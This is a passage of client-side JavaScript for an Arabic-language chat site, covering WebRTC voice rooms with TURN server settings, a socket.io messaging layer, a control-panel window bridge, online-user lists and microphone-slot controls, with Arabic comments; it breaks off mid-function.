// دالة جلب قيمة الكوكي بالاسم (Cookie Reader)

function getCookieValue(cookieName) {
    var namePrefix = cookieName + '=';
    var cookiesArray = document.cookie.split(';');
    for (var i = 0; i < cookiesArray.length; i++) {
        var singleCookie = cookiesArray[i].trim();
        if (singleCookie.indexOf(namePrefix) === 0) {
            return decodeURIComponent(singleCookie.substring(namePrefix.length));
        }
    }
    return null;
}


var myroom = null;
var nopm = false; // تعطيل المحادثات الخاصه
var nonot = false; // تعطيل التنبيهات
var turn_server = 1; // السيرفر الصوتي المختار
var bitrate = 24; // جودة المايك
var playing = null; // عنصر الميديا الذي يعمل حالياً

var activeAlerts = null;
var globalChatConfig = 0;
var isNoIconActive = false;
var isReconnecting = false;
var userSessionToken = null;
var userAuthHash = null;
var typingStateTracker = 0;
var activeChatTabWindow = null;
var userBadges = {};
var ncolors = [];
var bcc = 0;
var replyId = null;
var rcach = {};
var mic = [];
var myid = null;
var user_pic = null;
var room_pic = null;

(() => {
var AudioContextClass = window.AudioContext || window.webkitAudioContext;

function requestMicrophonePermission(constraints, onSuccess, onError) {
    try {
        if (debugMode) {
            logDebug(["getting Media", navigator.getUserMedia == null, navigator.webkitGetUserMedia == null, navigator.mozGetUserMedia == null, navigator.mediaDevices == null]);
        }
        var getUserMediaLegacy = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
        if (getUserMediaLegacy != null) {
            getUserMediaLegacy.call(navigator, constraints, onSuccess || function () {}, onError || function () {});
        } else {
            if (navigator.mediaDevices != null && navigator.mediaDevices.getUserMedia != null) {
                return navigator.mediaDevices.getUserMedia(constraints).then(onSuccess)["catch"](onError || function () {});
            }
        }
    } catch (error) {
        if (debugMode) {
            logDebug(["getmedia", error.message, error.stack]);
        }
    }
}


function logDebug(messageArray) {
    $("#d2").append(messageArray.join("<br>--") + "<br>");
}
var debugMode = false;
var isMuted = false;
var peerConnections = {};
var localAudioStream;
var audioContext;
var audioProcessor;


function connectVoiceToUser(targetUser) {
    if (targetUser == null) {
        return;
    }
    if (targetUser.id == myid || targetUser.id == targetUser.lid) {
        return;
    }
    if (peerConnections['_' + targetUser.id] != null) {
        peerConnections['_' + targetUser.id].on = null;
        peerConnections['_' + targetUser.id].destroy();
        delete peerConnections['_' + targetUser.id];
    }
    peerConnections['_' + targetUser.id] = new VoicePeerConnection(myroom, true, localAudioStream);
    peerConnections['_' + targetUser.id].uid = targetUser.id;
    send('p2', {
        't': "start",
        'id': targetUser.id
    });
    peerConnections['_' + targetUser.id].on("signal", function (signalData) {
        send('p2', {
            't': "signal",
            'id': targetUser.id,
            'dir': 1,
            'data': signalData
        });
    });
    peerConnections['_' + targetUser.id].on("error", function (err) {
        send('p2', {
            't': 'x',
            'dir': 1,
            'id': targetUser.id
        });
        peerConnections['_' + targetUser.id].destroy();
        delete peerConnections['_' + targetUser.id];
        setTimeout(function () {
            var activeUser = allUsersList[targetUser.id];
            if (activeUser != null && activeUser.roomid == myroom && mic.indexOf(myid) != -1) {
                connectVoiceToUser(activeUser);
            }
        }, 0x7d0);
    });
}


function VoicePeerConnection(roomName, isInitiator, localAudioStream, isDirectCall) {
    this.room = roomName;
    this.iscall = isDirectCall;
    this.ready = false;
    var self = this;
    this.stream = localAudioStream;
    this.audio = document.createElement("AUDIO");
    this.audio.setAttribute("autoplay", "autoplay");
    this.audioCtx = new AudioContextClass();
    this.ls = [];
    this.rs = [];
    this.peer = new SimplePeer({
        'initiator': isInitiator == true,
        'stream': localAudioStream,
        'config': {
            'iceTransportPolicy': false || false ? "relay" : undefined,
            'iceServers': [{
                'urls': "stun:://google.com"
            }, {
                'urls': "turn:93.115.24.143:443?transport=tcp",
                'credential': "jawalhost",
                'username': "jawalhost"
            }, {
                'urls': "turn:93.115.24.143:443?transport=udp",
                'credential': "jawalhost",
                'username': "jawalhost"
            }, {
                'urls': "turn:openrelay.metered.ca:443?transport=tcp",
                'username': "openrelayproject",
                'credential': "openrelayproject"
            }, {
                'urls': "turn:openrelay.metered.ca:443",
                'username': "openrelayproject",
                'credential': "openrelayproject"
            }].filter(function (server) {
                switch (1) {
                    case 1:
                        return true;
                    case 2:
                    case 4:
                        return server.urls.indexOf("tcp") != -1 || server.urls.indexOf("stun") != -1;
                    case 3:
                    case 5:
                        return server.urls.indexOf('udp') != -1 || server.urls.indexOf("stun") != -1;
                    case 6:
                        return server.urls.indexOf("openrelay") != -1 || server.urls.indexOf("stun") != -1;
                }
                return true;
            })
        }
    });

  
    var eventCallbacks = {};
    this.on = function (eventName, callback) {
        eventCallbacks[eventName] = callback;
    };
    this.alvl = 0;
    this.peer.on("stream", function (remoteStream) {
        if ("srcObject" in self.audio) {
            self.audio.srcObject = remoteStream;
        } else {
            self.audio.src = window.URL.createObjectURL(remoteStream);
        };
        if (eventCallbacks.stream) {
            eventCallbacks.stream(remoteStream);
        }
        if (self.iscall != true && isMutedAll) {
            self.audio.pause();
        }
        if (debugMode) {
            logDebug(["recivedStream"]);
        }
        analyzeAudioLevel(self.audioCtx, remoteStream, function (volume) {
            self.alvl = volume;
        });
    });
    var signalQueue = [];
    var signalTimer = setInterval(() => {
        if (eventCallbacks.signal && signalQueue.length) {
            var signalsToSend = signalQueue;
            signalQueue = [];
            eventCallbacks.signal(signalsToSend);
        }
    }, 0x190);
    this.peer.on("signal", function (signalData) {
        if (debugMode) {
            logDebug(["signal"]);
        }
        if (signalData.sdp) {
            signalData.sdp = signalData.sdp.replace("useinbandfec=1", "useinbandfec=1; maxaveragebitrate=" + Math.max(0x1f40, isNaN(0x18) ? 0x5dc0 : 24000) + "; maxplaybackrate=1000");
        }
        signalQueue.push(signalData);
    });
    this.peer.on("connect", function () {
        if (debugMode) {
            logDebug(["connected"]);
        }
        if (eventCallbacks.connect) {
            eventCallbacks.connect();
        }
    });
    this.peer.on("error", function (err) {
        if (debugMode) {
            logDebug(["pERR", JSON.stringify(err), err.code]);
        }
        clearInterval(signalTimer);
        if (eventCallbacks.error) {
            eventCallbacks.error(err);
        }
    });
    this.peer.on("end", function (endData) {
        if (debugMode) {
            logDebug(["pEnd", JSON.stringify(endData), endData.code]);
        }
        clearInterval(signalTimer);
        if (eventCallbacks.error) {
            eventCallbacks.error(endData);
        }
    });
    this.destroy = function (stopTracks) {
        clearInterval(signalTimer);
        try {
            self.audio.remove();
            self.peer.destroy();
        } catch (e) {}
        try {
            self.audioCtx.close();
        } catch (e) {}
        if (stopTracks) {
            try {
                this.stream.getTracks().forEach(function (track) {
                    track.stop();
                });
            } catch (e) {}
        }
    };
    return self;
}
var activeCallInstance = null;
var userListArray = [];
var isRoomLocked = false;
var socketClient = null;
var isSocketConnected = false;
var isStreamActive = false;
var ignoredUsersList = [];
var roomsOnlineCount = {};
var chatRoomsList = [];
var isBroadcastScrollTop = false;
var broadcastLinkCache = null;
var roomsOnlineList = [];
var chatEmojisList = [];
var chatRoomsArray = [];
var activeBansList = [];
var groupIcons = [];
var selectedEmojiObject = [];
var roomPassword = '';
var itemsQueueArray = [];
var alertsCacheObject = {};
var currentPrivateUser = null;
var isSidebarMenuOpen = false;
var activeConnectionsCount;
var allUsersList = {};
var shouldRefreshRoomsList = true;
var isMutedAll = false;
var activeWindowsList = {};
var chatPermissionsCookie = getCookieValue('cp');
var userPermissionsConfig = {
    'ico+': true,
    'ico-': true,
    'powers': true,
    'sico': true,
    'power': true,
    'rlist': true,
    'r+': true,
    'r-': true,
    'r^': true,
    'emos': true,
    'dro3': true
};
window.cpi = new Date().getTime().toString(36);
window.addEventListener("message", function (event) {
    var eventData = event.data;
    var senderWindow = event.source;
    if (senderWindow == null || senderWindow.cpi == null) {
        return;
    }
    if (chatPermissionsCookie == null && eventData[0] == "con") {
        if (eventData[1] != myid) {
            senderWindow.postMessage(["close", {}]);
            return;
        }
        activeWindowsList[senderWindow.cpi] = senderWindow;
        senderWindow.postMessage(["con", [ignoredUsersList, userListArray.map(function (user) {
            var userCopy = Object.assign({}, user);
            userCopy.ht = null;
            return userCopy;
        }), roomsOnlineList, roomsOnlineCount, chatEmojisList, groupIcons, activeBansList, myid]]);
        return;
    }
    if (chatPermissionsCookie && location.pathname == "/cp") {
        if (eventData[0] == 'con') {
            executeControlPanelAction("login", {
                'msg': 'ok',
                'id': eventData[1][0x7]
            });
            window.onbeforeunload = null;
            chatEmojisList = eventData[1][4];
            groupIcons = eventData[1][5];
            activeBansList = eventData[1][6];
            executeControlPanelAction("emos", chatEmojisList);
            executeControlPanelAction("dro3", groupIcons);
            executeControlPanelAction("sico", activeBansList);
            executeControlPanelAction("powers", eventData[1][2]);
            executeControlPanelAction("rlist", eventData[1][1]);
            executeControlPanelAction("ulist", eventData[1][0]);
            executeControlPanelAction("power", eventData[1][3]);
            return;
        }
        executeControlPanelAction(eventData[0], eventData[1]);
    } else {
        var activeWin = activeWindowsList[senderWindow.cpi];
        if (activeWin == null) {
            senderWindow.postMessage(["close", {}]);
            return;
        }
        send("cpi", [senderWindow.cpi, eventData]);
    }
});

initializeSocketConnection();

function muteAll() {
    $("#muteall").attr("disabled", true);
    setTimeout(function () {
        $("#muteall").removeAttr("disabled");
    }, 0x3e8);
    if (isMutedAll != true) {
        isMutedAll = true;
        $("#muteall").css("background-color", '');
        if (mic.indexOf(myid) != -1) {
            tmic(-1);
        }
        for (var userId in peerConnections) {
            var connection = peerConnections[userId];
            if (connection != null && connection.audio != null) {
                connection.audio.pause();
            }
        }
    } else {
        isMutedAll = false;
        $("#muteall").css("background-color", "mediumseagreen");
        for (var userId in peerConnections) {
            var connection = peerConnections[userId];
            if (connection != null && connection.audio != null) {
                connection.audio.play();
            }
        }
    }
}
var chatInteractionsConfig = {
    'mlikes': true,
    'bclikes': true,
    'mreply': false,
    'bcreply': false,
    'calls': false
};
navigator.n = {};
makeElementDraggable(document.getElementById('call'));

function makeElementDraggable(element) {
    var posX = 0;
    var posY = 0;
    var initialX = 0;
    var initialY = 0;
    element.onmousedown = startDragging;
    element.ontouchstart = startDragging;
  
  

    function startDragging(e) {
        e = e || window.event;
        try {
            var touch = (e.touches || [])[0];
            var clientX = (touch || e).clientX;
            var clientY = (touch || e).clientY;
            initialX = clientX;
            initialY = clientY;
            document.onmouseup = stopDragging;
            document.onmousemove = dragElement;
            document.ontouchmove = dragElement;
            document.ontouchend = stopDragging;
        } catch (err) {}
        return true;
    }
  

    function dragElement(e) {
        e = e || window.event;
        try {
            var touch = (e.touches || [])[0];
            var clientX = Math.max(0, (touch || e).clientX);
            var clientY = Math.max(0, (touch || e).clientY);
            posX = initialX - clientX;
            posY = initialY - clientY;
            initialX = clientX;
            initialY = clientY;
            element.style.top = Math.min(window.innerHeight - element.clientHeight, Math.max(0, element.offsetTop - posY)) + 'px';
            element.style.left = Math.min(window.innerWidth - element.clientWidth, Math.max(0, element.offsetLeft - posX)) + 'px';
        } catch (err) {}
        return true;
    }


    function stopDragging() {
        document.onmouseup = null;
        document.onmousemove = null;
        document.ontouchmove = null;
        document.ontouchend = null;
    }
}


function logout() {
    send("logout", {});
    closex(0x1f4);
}


function sendbc(isDelayed, alternativeBox, inputSelector) {
    if (inputSelector && 0 && allUsersList[myid].rep < 0) {
        alert("تعليقات الحايط تتطلب 0 إعجاب");
        $(inputSelector || ".tboxbc").val('');
        return;
    }
    if (isDelayed) {
        replyId = null;
        broadcastLinkCache = null;
        openAdminPopupDialog('d2bc', function () {
            var messageText = $(".tboxbc").val();
            $(".tboxbc").val('');
            var linkData = broadcastLinkCache;
            broadcastLinkCache = '';
            if ((messageText == "%0A" || messageText == "%0a" || messageText == '' || messageText == "\n") && (linkData == '' || linkData == null)) {
                return;
            }
            send('bc', {
                'msg': messageText,
                'link': linkData
            });
            return;
        }, true);
        return;
    } else {
        broadcastLinkCache = null;
    }
    $(".ppop .reply").parent().remove();
    var finalMessage = $(inputSelector || ".tboxbc").val();
    $(inputSelector || ".tboxbc").val('');
    var cachedLink = broadcastLinkCache;
    broadcastLinkCache = '';
    if ((finalMessage == "%0A" || finalMessage == '%0a' || finalMessage == '' || finalMessage == "\n") && (cachedLink == '' || cachedLink == null)) {
        return;
    }
    send('bc', {
        'msg': finalMessage,
        'link': cachedLink,
        'bid': replyId != null && replyId.indexOf('.bid') != -1 ? replyId.replace('.bid', '') : undefined
    });
    if (replyId != null) {
        replyId = null;
    }
}
var isIosDevice = false;

// الى هنا تم التاكد

function getSanitizedReferrer() {
    var domainReferrer = document.referrer || '';
    if (domainReferrer.indexOf("http://" + location.hostname) == 0) {
        return '';
    }
    if (domainReferrer.indexOf("://") != -1) {
        domainReferrer = domainReferrer.replace(/(.*?)\:\/\//g, '').split('/')[0];
    }
    return domainReferrer;
}

function updateLazyImagesAndSortRooms() {
    if (isSidebarMenuOpen && $("#dpnl:visible").find("#users.active,#rooms.active").length > 0) {
        openPopupDialog();
        isSidebarMenuOpen = false;
        shouldRefreshRoomsList = true;
    }
    if ($("#dpnl:visible").find("#wall.active").length > 0) {
        $("#wall").find(".lazy").each(function (index, imgElement) {
            imgElement = $(imgElement);
            imgElement.removeClass("lazy");
            imgElement.attr("src", imgElement.attr("dsrc"));
        });
    }
    $("div.active img.lazy:visible").each(function (index, imgElement) {
        imgElement = $(imgElement);
        imgElement.removeClass("lazy");
        imgElement.attr("src", imgElement.attr('dsrc'));
    });
    if (shouldRefreshRoomsList && $("#dpnl:visible").find("#rooms.active").length) {
        shouldRefreshRoomsList = false;
        var roomsElements = $("#rooms").children(".room");
        var sortRoomsBound = Array.prototype.sort.bind(roomsElements);
        sortRoomsBound(function (roomA, roomB) {
            var visitorsCountA = parseInt(roomA.getAttribute('v') || 0);
            var visitorsCountB = parseInt(roomB.getAttribute('v') || 0);
            if (visitorsCountA == visitorsCountB) {
                visitorsCountA = roomA.getAttribute('n') + '';
                visitorsCountB = roomB.getAttribute('n') + '';
                return visitorsCountA.length == visitorsCountB.length ? visitorsCountA.localeCompare(visitorsCountB) : visitorsCountA.length - visitorsCountB.length;;
            }
            return visitorsCountA < visitorsCountB ? 1 : -1;
        });
        $("#rooms").append(roomsElements);
    }
}

function runAutoScrollTimer() {
    var chatMessagesArea = $("#d2");
    var broadcastArea = $("#d2bc")[0];
    var loadMoreBroadcastButton = $("#bcmore");
    shouldScrollDownForce = true;
    setInterval(function () {
        if (shouldScrollDownForce || isScrollActive) {
            shouldScrollDownForce = false;
            if (isScrollActive) {
                isScrollActive = false;
                var offsetDiff = document.documentElement.offsetHeight - document.body.offsetHeight;
                if (offsetDiff > 10) {
                    document.documentElement.scrollTop = offsetDiff / 2;
                }
                chatMessagesArea.scrollTop(chatMessagesArea[0].scrollHeight);
            } else {
                isScrollActive = true;
            }
        }
        if (isBroadcastScrollTop == true && broadcastArea.scrollTop == 0) {
            loadMoreBroadcastButton.hide();
            isBroadcastScrollTop = false;
        }
    }, 0xc8);
}
var globalTempText = '';

function load(data) {
    isIosDevice = /ipad|iphone|ipod/i.test(navigator.userAgent.toLowerCase());
    if ($(window).width() >= 0x258) {
        $("meta[name='viewport']").attr("content", " user-scalable=0, width=600");
    }
    $('#u1').val(decodeURIComponent(getv('u1')));
    $("#u2").val(decodeURIComponent(getv('u2')));
    $("#pass1").val(decodeURIComponent(getv('p1')));
    debugMode = getCookieValue("debug") == '1';
    isNoIconActive = getCookieValue("noico") == '1';
    if (isNoIconActive) {
        user_pic = "pic.png";
        room_pic = "room.png";
    }
    if (debugMode) {
        window.onerror = function (message, source, lineno) {
            $("#d2").append("Error: " + message + " Script: " + source + " Line: " + lineno + "<br>");
        };
    }
    var configValue = getv("zoom");
    if (configValue == '') {
        configValue = '1';
        setv("zoom", configValue);
    }
    if (isNaN(parseInt(configValue)) == false && configValue != '1') {
        $("#zoom").val(configValue).trigger("change");
        fixSize();
    }
    configValue = getv("bitrate");
    if (configValue == '') {
        configValue = '24';
        setv("bitrate", configValue);
    }
    if (isNaN(parseInt(configValue)) == false && configValue != '24') {
        $("#turn_bitrate").val(configValue).trigger("change");
    }
    configValue = getv("turn_server");
    if (configValue == '') {
        configValue = '1';
        setv("turn_server", configValue);
    }
    if (isNaN(parseInt(configValue)) == false && configValue != '1') {
        $("#turn_server").val(configValue).trigger("change");
    }
    if (getv("isl") == "yes") {
        $("#tlogins .nav-tabs a[href=\"#l2\"]").click();
    }
    if (location.pathname != "/cp" && chatPermissionsCookie || location.pathname == "/cp" && !chatPermissionsCookie) {
        location.href = '/';
        return;
    }
    if (chatPermissionsCookie) {
        $("#room,#dpnl").remove();
        jQuery.ajax({
            'type': "GET",
            'url': "jscolor/jscolor.js",
            'dataType': "script",
            'cache': true
        });
        jQuery.ajax({
            'type': "GET",
            'url': "jquery.tablesorter.min.js",
            'dataType': "script",
            'cache': true
        });
        renderSelectedPowerDetails();
        var colorPaletteList = ["202020", "202070", "2020c0", "207020", "207070", "2070c0", "20c020", "20c070", "20c0c0", "702020", "702070", "7020c0", "707020", "707070", "7070c0", "70c020", "70c070", "70c0c0", "c02020", "c02070", "c020c0", "c07020", "c07070", "c070c0", "c0c020", "c0c070", "c0c0c0", "FFFFFF"];
        var defcc = [];
        var colorBoxContainer = $("<div style='width:260px;height:200px;line-height: 0px!important;' class='break'></div>");
        colorPaletteList.forEach(function (baseColor) {
            var colorShades = [];
            colorShades.push(generateColorShade(baseColor, 0x1e));
            colorShades.push(generateColorShade(baseColor, 15));
            colorShades.push(baseColor);
            colorShades.push(generateColorShade(baseColor, -15));
            colorShades.push(generateColorShade(baseColor, -0x1e));
            colorShades.push(generateColorShade(baseColor, -0x28));
            colorShades.forEach(function (finalHexColor) {
                defcc.push(finalHexColor);
                colorBoxContainer.append("<div v='#" + finalHexColor + "'style='width:40px;height:40px;background-color:#" + finalHexColor + ";display:inline-block;'></div>");
            });
        });
        colorBoxContainer.append("<div class='border fa fa-ban' v='' style='width:40px;height:40px;background-color:;display:inline-block;color:red;'></div>");
        window.cldiv = colorBoxContainer[0].outerHTML;
        $(".cpick").click(function () {
            var colorBoxInstance = $(colorBoxContainer);
            var currentPickerBtn = this;
            colorBoxInstance.find("div").off().click(function () {
                $(currentPickerBtn).css("background-color", this.style["background-color"]);
                $(currentPickerBtn).css("background-color", $(this).attr('v')).attr('v', $(this).attr('v'));
            });
            openPopupDialog(currentPickerBtn, colorBoxInstance).css("left", "0px");;
        });
        $("#cp li").hide();
        if (window.opener == null) {
            closex();
            return;
        }
        window.opener.postMessage(['con', chatPermissionsCookie]);
        setInterval(() => {
            if (window.opener == null || window.opener.myid != chatPermissionsCookie) {
                closex();
            }
        }, 0x1388);
    }
    pri();
}


function pri() {
    var storedSessionTime = getv('pr') || '';
    globalChatConfig = parseInt(window.name) || parseInt(storedSessionTime) || 0;
    if (globalChatConfig == 0) {
        globalChatConfig = new Date().getTime();
    }
    window.name = globalChatConfig + '';
    setv('pr', globalChatConfig + '');
    return new Date().getTime() - globalChatConfig > 10800000 ? globalChatConfig : 0;
}

function decryptCommand(cipherText) {
    var charArray = (cipherText || '').split('');
    var arrayLength = charArray.length;
    for (var i = 0; i < arrayLength; i++) {
        charArray[i] = String.fromCharCode(cipherText.charCodeAt(i) ^ 2);
        i += i < 0x14 ? 1 : i < 0xc8 ? 4 : 0x10;
    }
    return charArray.join('');
}

function send(commandName, commandData) {
    if (chatPermissionsCookie) {
        if (window.opener == null) {
            closex();
            return;
        }
        window.opener.postMessage([commandName, commandData]);
    } else {
        socketClient.emit("msg", {
            'cmd': decryptCommand(commandName),
            'data': commandData
        });
    }
}
var reconnectionAttempts = 0;
var isOverlayLoginActive = false;

function handleDisconnectFallback() {
    if (isRoomLocked) {
        return;
    }
    fixSize(1);
    reconnectionAttempts++;
    if (myid != null && userSessionToken != null && reconnectionAttempts <= 6) {
        isReconnecting = true;
        isSystemQueueLocked = false;
        systemCommandQueue = [];
        $('.ovr').remove();
        if ($(".ovr").length == 0) {
            isOverlayLoginActive = true;
            $(document.body).append("<div class=\"ovr\" style=\"width:100%;height:100%;z-index:999999;position: fixed;left: 0px;top: 0px;background-color: rgba(0, 0, 0, 0.6);\"><div style=\"margin: 25%;margin-top:5%;border-radius: 4px;padding: 8px;width: 220px;\" class=\" label-warning\"><button class=\"btn btn-danger fr\" style=\"\n            margin-top: -6px;margin-right: -6px;\" onclick=\"$(this).hide();window.closex(100);\">[ x ]</button><div>.. يتم إعاده الاتصال</div></div></div>");
        }
        setTimeout(function () {
            initializeSocketConnection();
        }, 0xbb8);
        return;
    }
    closex();
}

function initializeSocketConnection() {
    if (chatPermissionsCookie) {
        return;
    }
    var transportProtocols = "WebSocket" in window || "MozWebSocket" in window ? ["websocket"] : ["polling", "websocket"];
    socketClient = io('', {
        'reconnection': false,
        'transports': transportProtocols
    });
    socketClient.on("connect", function () {
        isSocketConnected = true;
        if (isOverlayLoginActive) {
            $(".ovr div").attr("class", "label-info").find("div").text("متصل .. يتم تسجيل الدخول");
        }
        showNotificationToast("success", "متصل");
        if (myid != null && userSessionToken != null && isReconnecting) {
            socketClient.emit("rc2", {
                'token': userAuthHash,
                'n': userSessionToken
            });
        } else {
            send("online", {});
        }
    });
    var isLoginApproved = false;
    socketClient.on('msg', function (serverResponse) {
        serverResponse.cmd = decryptCommand(serverResponse.cmd);
        if (serverResponse.cmd == 'ok') {
            isLoginApproved = true;
        }
        if (serverResponse.cmd == "nok") {
            isLoginApproved = false;
            userSessionToken = null;
        }
        if (!isReconnecting && isLoginApproved) {
            userSessionToken = serverResponse.k;
        }
        var performanceStartTime;
        if (debugMode) {
            performanceStartTime = performance.now();
        }
        if (serverResponse.cmd == "power") {
            Object.freeze(serverResponse.data);
        }
        executeControlPanelAction(serverResponse.cmd, serverResponse.data);
        if (debugMode) {
            console.log(serverResponse.cmd, performance.now() - performanceStartTime);
        }
    });
    socketClient.on("disconnect", function (reason) {
        showNotificationToast("danger", "غير متصل");
        handleDisconnectFallback();
    });
    socketClient.on("connect_error", function (error) {
        $(".ovr div").attr("class", "label-danger").find("div").text("فشل الاتصال ..");
        showNotificationToast("danger", "غير متصل");
        handleDisconnectFallback();
    });
    socketClient.on("connect_timeout", function (timeout) {
        $(".ovr div").attr("class", "label-danger").find("div").text("فشل الاتصال ..");
        showNotificationToast("danger", "غير متصل");
        handleDisconnectFallback();
    });
    socketClient.on("error", function (err) {
        $(".ovr div").attr("class", "label-danger").find("div").text("فشل الاتصال ..");
        showNotificationToast("danger", "غير متصل");
        handleDisconnectFallback();
    });
}

function setupIosInputFixes() {
    if (isIosDevice) {
        $("textarea").on("focus", function () {
            scrollBodyToInput(this);
        });
        $("textarea").on("blur", function () {
            resetIosScroll();
        });
        document.addEventListener("focusout", function (e) {
            window.scrollTo(0, 0);
        });
    }
}

function scrollBodyToInput(inputElement) {
    if (isIosDevice == false) {
        return;
    }
    var inputTopPosition = $(inputElement).position().top - (document.body.scrollHeight - window.innerHeight) - 10;
    $(document.body).scrollTop(inputTopPosition);
}

function resetIosScroll() {
    if (isIosDevice == false) {
        return;
    }
    $(document.body).scrollTop(0);
}

function updateOnlineUsersList(usersData, actionType) {
    var onlineListArea = $("#lonline");
    if (typeof usersData == "string" && usersData.indexOf('[') != -1) {
        usersData = JSON.parse(usersData);
    }
    var usersArray = usersData;
    var userTemplateHtml = $($("#uhtml").html());
    userTemplateHtml.find(".u-pic").css({
        'width': "56px"
    });
    var baselineTemplate = userTemplateHtml[0].outerHTML;
    var finalTotalCount = usersArray.length;
    if (actionType == 0) {
        finalTotalCount = null;
        onlineListArea.children().remove();
        try {
            usersArray = usersArray.slice(-0x3c);
        } catch (e) {}
        var compiledElementsQueue = [];
        for (var i = 0; i < usersArray.length; i++) {
            var userObj = usersArray[i];
            if (userObj.s == true) {
                continue;
            }
            if (userObj.pic == "pic.png" && typeof user_pic == "string") {
                userObj.pic = user_pic;
            }
            var userNode = $(baselineTemplate);
            userNode.addClass(userObj.id);
            userNode.find(".u-topic").text(userObj.topic).css({
                'background-color': userObj.bg,
                'color': userObj.ucol
            });
            userNode.find(".u-msg").text(userObj.msg);
            userNode.find(".u-pic").css("background-image", "url(\"" + userObj.pic + "\")");
            userNode.find(".ustat").remove();
            if (userObj.co == '--' || userObj.co == null || userObj.co == 'A1' || userObj.co == 'A2' || userObj.co == 'EU' || userObj.co == 'T1') {
                userNode.find(".co").attr('src', "flags/--.png");
            } else {
                userNode.find(".co").attr("src", "flags/" + userObj.co + ".png");
            }
            if ((userObj.ico || '') != '') {
                userNode.find(".u-ico").attr("src", userObj.ico.replace("dro3/dro3/", "dro3/").replace("dro3/sico", "sico/"));
            }
            compiledElementsQueue.push(userNode);
        }
        onlineListArea.append(compiledElementsQueue);
    } else {
        if (actionType == 1) {
            var userObj = usersArray;
            if (userObj.s == true) {
                return;
            }
            if (userObj.pic == "pic.png" && typeof user_pic == "string") {
                userObj.pic = user_pic;
            }
            var userNode = $(baselineTemplate);
            userNode.addClass(userObj.id);
            userNode.find(".u-topic").text(userObj.topic).css({
                'background-color': userObj.bg,
                'color': userObj.ucol
            });
            userNode.find(".u-msg").text(userObj.msg);
            userNode.find(".u-pic").css("background-image", "url(\"" + userObj.pic + "\")");
            userNode.find(".ustat").remove();
            if (userObj.co == '--' || userObj.co == null || userObj.co == 'A1' || userObj.co == 'A2' || userObj.co == 'EU' || userObj.co == 'T1') {
                userNode.find(".co").attr("src", "flags/--.png");
            } else {
                userNode.find('.co').attr("src", "flags/" + userObj.co + ".png");
            }
            if ((userObj.ico || '') != '') {
                userNode.find(".u-ico").attr("src", userObj.ico.replace("dro3/dro3/", "dro3/").replace("dro3/sico", "sico/"));
            }
            onlineListArea.prepend(userNode);
            finalTotalCount = (parseInt($("#s1").text()) || 0) + 1;
        } else {
            $("#lonline ." + usersArray).remove();
            finalTotalCount = (parseInt($("#s1").text()) || 0) - 1;
        }
    }
    if (finalTotalCount != null) {
        $('#s1').text(finalTotalCount);
    }
}

function serializeFormInputsData(formSelector) {
    formSelector = $(formSelector);
    var extractedDataMap = {};
    $.each(formSelector.find("input"), function (index, inputElement) {
        switch ($(inputElement).attr('type')) {
            case "text":
                extractedDataMap[$(inputElement).attr("name")] = $(inputElement).val().replace(/\"/g, '');
                break;
            case "checkbox":
                extractedDataMap[$(inputElement).attr("name")] = $(inputElement).prop("checked");
                break;
            case "number":
                extractedDataMap[$(inputElement).attr("name")] = parseInt($(inputElement).val(), 10);
                break;
        }
    });
    return extractedDataMap;
}
var isScrollActive = false;
var shouldScrollDownForce = false;

function setv(key, value) {
    if (typeof Storage !== "undefined") {
        try {
            localStorage.setItem(key, value);
        } catch (e) {
            setFallbackCookieValue(key, value);
        }
    } else {
        setFallbackCookieValue(key, value);
    }
}


function getv(key) {
    if (typeof Storage !== "undefined") {
        var storedValue = '';
        try {
            storedValue = localStorage.getItem(key);
        } catch (e) {
            return getFallbackCookieValue(key);
        }
        if (storedValue == 'null' || storedValue == null) {
            storedValue = '';
        }
        return storedValue;
    } else {
        return getFallbackCookieValue(key);
    }
}

function setFallbackCookieValue(cookieName, cookieValue, dummyParam) {
    var expiryDate = new Date();
    expiryDate.setTime(expiryDate.getTime() + 518400000);
    var expiresString = "expires=" + expiryDate.toUTCString();
    document.cookie = cookieName + '=' + encodeURIComponent(cookieValue).split("'").join("%27") + "; " + expiresString + ";domain=" + window.location.hostname + ";path=/";
}

function getFallbackCookieValue(cookieName) {
    var namePrefix = cookieName + '=';
    var cookiesArray = document.cookie.split(';');
    for (var i = 0; i < cookiesArray.length; i++) {
        var singleCookie = cookiesArray[i];
        while (singleCookie.charAt(0) == " ") {
            singleCookie = singleCookie.substring(1);
        }
        if (singleCookie.indexOf(namePrefix) != -1) {
            return decodeURIComponent(singleCookie.substring(namePrefix.length, singleCookie.length));
        }
    }
    return '';
}

function fixSize(dummyParam) {
    shouldScrollDownForce = true;
}
// دالة تحديث ورسم حالة المايكات الخمسة في واجهة الشات (mic0 إلى mic4)
function updateRoomMicsStatus() {
    var currentRoomObj = myroom ? rcach[myroom] : null;
    // التحقق مما إذا كان المستخدم الحالي مشرفاً (Admin/Operator) داخل الغرفة
    var isRoomOperator = currentRoomObj && currentRoomObj.ops && currentRoomObj.ops.indexOf(allUsersList[myid].lid) != -1;

    // حلقة تكرار للمرور على المايكات الخمسة المتاحة بالشات
    for (var micIndex = 0; micIndex < 5; micIndex++) {
        var micUserId = mic[micIndex];
        var isMicOccupied = false;
        var micUserObj;
        var micElement = $("#mic" + micIndex); // عناصر الواجهة المستخرجة من فحصك mic0, mic1...

        if (typeof micUserId == "string") {
            micUserObj = allUsersList[micUserId];
            if (micElement.length && micUserObj != null) {
                isMicOccupied = true;
            }
        }
        if (micUserId != myid) {
            micElement.off().attr("onclick", '');
        }
        micElement.attr("uid", micUserId || '');

        // إذا كان المايك مشغولاً (يوجد عضو يتحدث حالياً)
        if (isMicOccupied) {
            micElement.find('.u').show();
            micElement.css("background-image", "url(" + micUserObj.pic + ')');
            micElement.find("img")[0].src = getUserIconPath(micUserObj);
            micElement.find("span").text(micUserObj.topic);

            // إذا كان المايك المشغول هو مايك الخاص بك
            if (micUserId == myid) {
                micElement.off().attr("onclick", "tmic(-1);"); // عند الضغط عليه تترك المايك
            } else {
                // قائمة الخيارات الإدارية للأعضاء الآخرين على المايك
                micElement.off().click(function () {
                    var clickedMicBtn = this;
                    var currentMicIdx = parseInt($(this).attr('i'));
                    var currentMicUser = mic[currentMicIdx];

                    setTimeout(function () {
                        var contextMenuOptions = ["عرض الملف"];
                        // فحص صلاحيات الإدارة المستخرجة (كلاس mic) أو إذا كان مشرف غرفة ops
                        if (userPermissionsConfig.mic || isRoomOperator) {
                            contextMenuOptions.push("سحب المايك");
                            if (currentMicUser == 0) {
                                contextMenuOptions.push("تفعيل المايك");
                            } else {
                                contextMenuOptions.push("قفل المايك");
                            }
                        }
